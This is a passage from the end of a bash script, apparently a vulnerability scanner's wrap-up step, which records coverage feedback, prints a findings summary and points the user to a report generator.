        --findings-dir "$FINDINGS_DIR" \
        --recon-dir "$RECON_DIR" \
        --scanner-version "vuln_scanner.sh@$(git -C "$BASE_DIR" rev-parse --short HEAD 2>/dev/null || echo unknown)" \
        >/dev/null 2>&1; then
    log_done "Coverage matrix feedback: $(dirname "$FINDINGS_DIR")/scanner_pass.json"
else
    log_warn "Unable to write scanner_pass.json (coverage matrix feedback skipped)"
fi

cat "$FINDING_SUMMARY"

echo ""
echo "  All findings saved to: $FINDINGS_DIR/"
echo ""
echo "  Next: Generate reports"
echo "    python3 tools/report_generator.py $FINDINGS_DIR"
echo "============================================="
